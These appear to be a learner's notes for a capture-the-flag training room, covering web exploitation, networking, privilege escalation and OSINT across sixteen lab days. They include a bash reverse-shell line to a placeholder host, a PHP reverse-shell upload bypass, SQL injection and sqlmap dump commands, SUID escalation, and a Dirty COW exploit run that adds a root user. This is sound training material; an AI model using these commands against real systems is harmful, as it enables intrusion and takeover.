# Room
https://tryhackme.com/room/learncyberin25days

# Task 1 - Intro
Intro

# Task 2 - Get Connected
Get Connected

# Task 3 - Day 1 - Web Exploitation
* DNS
* IP
* HTTP/S
  * HTTP is an inherently stateless protocol, data does not persist
* Cookies
  * a constrcut that supports user state

Complete questions, CyberChef is your friend:
* https://gchq.github.io/CyberChef/

# Task 4 - Day 2 - Web Exploitation
* GET parameters
  * ?test=value
    * ? specifies the parameter name is coming next
    * test is the parameter name
    * = specifies the parameter value is coming next
    * value is the parameter value
  * ?test=value&test2=value2
    * ? specifies the parameter name is coming next
    * test is the parameter name
    * = specifies the parameter value is coming next
    * value is the parameter value
    * & specifies another parameter name is coming next
    * test2 is the next parameter name
    * = specifies the parameter value is coming next
    * value2 is the paramemter value
* File Uploads
  * file extension filtering is important
* Reverse Shells
* Reverse Shell Listeners

The questions are completed by using the information on the displayed web page.  You will also use file extension bypassing by changing the name of this reverseshell to .jpg.php

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

After the file is uploaded you can start your listener with nc -nvlp and then execute the reverse shell and grab the flag

# Task 5 - Day 3 - Web Exploitation
* Authentication
* Default Credentials
* Dictionary Attacks with Burp Suite

Using Burp Suite intruder with the cluster bomb setting, brute force your way into the web application login system using the provided short list of possible credentials while observing the differences in response output

# Task 6 - Day 4 - Web Exploitation
* Fuzzing
* gobuster
* wfuzz

Wordlists
* https://github.com/danielmiessler/SecLists

# Task 7 - Day 5 - Web Exploitation
* SQL Injection
  * Login Bypass
  * Blind SQL Injection
  * Union SQL Injection
* SQLMap
  * SQLMap and Burp Suite

* Resources
  * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
  * https://github.com/payloadbox/sql-injection-payload-list
  * https://www.codecademy.com/articles/sql-commands

```
' or true --

sqlmap -r r.request --dump-all --dbms sqlite --tamper=space2comment
```

# Task 8 - Day 6 - Web Exploitation
* XSS
  * Stored XSS
  * Reflected XSS
* Detection
  * OWASP ZAP
* Resources
  * https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md
  * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
  * https://github.com/payloadbox/xss-payload-list

# Task 9 - Day 7 - Networking
* IP Address
  * Public
  * Private
  * NAT
* Protocols
  * TCP
    * Three-Way Handshake
    * ISN
    * Reassembly
  * IP
* Wireshark
  * Filters

```
icmp
http.request.method eq get
http.request.method == "GET"
ftp
ftp.request.command == "PASS"
File > Export Objects > HTTP
```

# Task 10 - Day 8 - Networking
* nmap
* scanning
  * three-way handshake
  * connect scan : -sT
  * SYN scan : -sS
  * results
    * SYN/ACK = open
    * RST = closed
    * Multiple attempts = filtered
  * additional types
    * -A - identify services
    * -O - OS detection
    * -p - scan specific port
    * -p- - scan all ports
    * -sV - version and fingerprint
* timing
  * -T0 - stealthiest
  * -T5 - most aggressive
* scripting engine
  * --script

* scanning defense
  * snort
  * suricata

```
map -A -T4 10.10.33.224 | tee nmap.txt
```

# Task 11 - Day 9 - Networking
* FTP
  * TCP 20 - data
  * TCP 21 - commands
* Anonymous login
* ftp 1.2.3.4
* commands
  * ls
  * cd
  * get
  * put

```
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

# Task 12 - Day 10 - Networking
* Samba
* SMB - Windows and Linux support
  * request/response
  * share
  * enumeration
    * enum4linux
  * access
    * smbclient
* NFS - Linux support

```
enum4linux 10.10.178.30 | tee e4l.txt
smbclient //10.10.178.30/tbfc-hr
```

# Task 13 - Day 11 - Networking
* Privilege Escalation
* Permissions
  * User
  * Administrator
* Types of Escalation
  * Horizontal - access another user's resources that has the same permissions as you
  * Vertical - accessing data acting as a higher privileged account
* Checklists
  * https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
  * https://payatu.com/guide-linux-privilege-escalation
  * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
  * https://gtfobins.github.io/
* SUID is a permission added to an executable that allows it to execute as the user that owns the executable
  * find / -perm -u=s -type f 2>/dev/null
  * /bin/bash -p

* Enumeration beyond nmap
  * backups
  * passwords
  * configuration
  * LinEnum

* Resources
  * https://dvwa.co.uk/

# Task 14 - Day 12 - Networking
* Vulnerabilities
  * https://www.rapid7.com/
  * https://attackerkb.com/
  * https://cve.mitre.org/cve/
  * https://www.exploit-db.com/
* CGI
  * /cgi-bin
  * arguments
    * ?&
    * ?&ls
    * URL encoded
      * https://www.techopedia.com/definition/10346/url-encoding
* metasploit
  * search for CVE
  * set targeturi to /cgi-bin/[thescriptname]

# Task 15 - Day 13 - Networking
Challenge Task

* Enumeration - nmap
```
nmap -A -T4 10.10.103.38 | tee nmap.txt
```
* Initial access - telnet
```
telnet 10.10.103.38
```
* Enumeration - system
```
$ pwd
/home/santa
$ whoami
santa
$ sudo -l
[sudo] password for santa: 
Sorry, user santa may not run sudo on christmas.
$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
$ uname -a
Linux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
$ cat /etc/issue
HI SANTA!!! 

We knew you were coming and we wanted to make
it easy to drop off presents, so we created
an account for you to use.

Username: santa
Password: clauschristmas

We left you cookies and milk!
```
* Exploiting dirtycow
  * https://dirtycow.ninja/
```
wget http://a.b.c.d/dirty.c
--2021-05-08 17:51:49--  http://a.b.c.d/dirty.c
Connecting to a.b.c.d:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2826 (2.8K) [text/x-csrc]

gcc -pthread dirty.c -o dirty -lcrypt

$ ./dirty                                                                                                                                            
/etc/passwd successfully backed up to /tmp/passwd.bak                                                                                                
Please enter the new password:                                                                                                                       
Complete line:                                                                                                                                       
firefart:fiLU3qfsE1tyU:0:0:pwned:/root:/bin/bash                                                                                                     
                                                                                                                                                     
mmap: 7f38dfd30000                                                                                                                                   
madvise 0                                                                                                                                            
                                                                                                                                                     
ptrace 0                                                                                                                                             
Done! Check /etc/passwd to see if the new user was created.                                                                                          
You can log in with the username 'firefart' and the password 'blank'.                                                                                
                                                                                                                                                     
                                                                                                                                                     
DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd                                                                                            
Done! Check /etc/passwd to see if the new user was created.                                                                                          
You can log in with the username 'firefart' and the password 'blank'.                                                                                
                                                                                                                                                     
                                                                                                                                                     
DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd                                                                                            
$                                                                                                                                                    
$ su firefart                                                                                                                                        
Password:                                                                                                                                            
firefart@christmas:/home/santa# whoami                                                                                                               
firefart                                           
```

# Task 16 - Day 14 - OSINT
OSINT Challenge
* Resources
  * https://namechk.com/
  * https://whatsmyname.app/
  * https://namecheckup.com/
  * https://github.com/WebBreacher/WhatsMyName
  * https://github.com/sherlock-project/sherlock
  * https://yandex.com/images/
  * https://tineye.com/
  * https://www.bing.com/visualsearch?FORM=ILPVIS
  * https://haveibeenpwned.com/
  * https://dehashed.com/
  * https://scylla.so/

# Task 17 - Day 15 - Scripting
* Python
  * interpreted, high level, general purpose programming language
  * variables
    * string
    * integer
    * float
    * list
  * operators : + / * ** % -
  * boolean
    * true
    * false
  * if statements
  * loops
  * libraries
    * https://pypi.org/
  * pass by reference

# Task 18 - Day 16 - Scripting
Challenge - Find the API key using Python

My solution
```
#!/usr/bin/python3
import requests

url = "http://10.10.110.175/api/"
keys = range(1,100,2)

print("Trying API keys against {}".format(url))
print("Scanning keys...")
for k in keys:
    test_url = url + str(k)
    r = requests.get(test_url)
    print(k, end='')
    if "Key not valid" not in r.text:
        print("")
        print("Key found with key {}".format(k))
        print(r.text)
        break
```
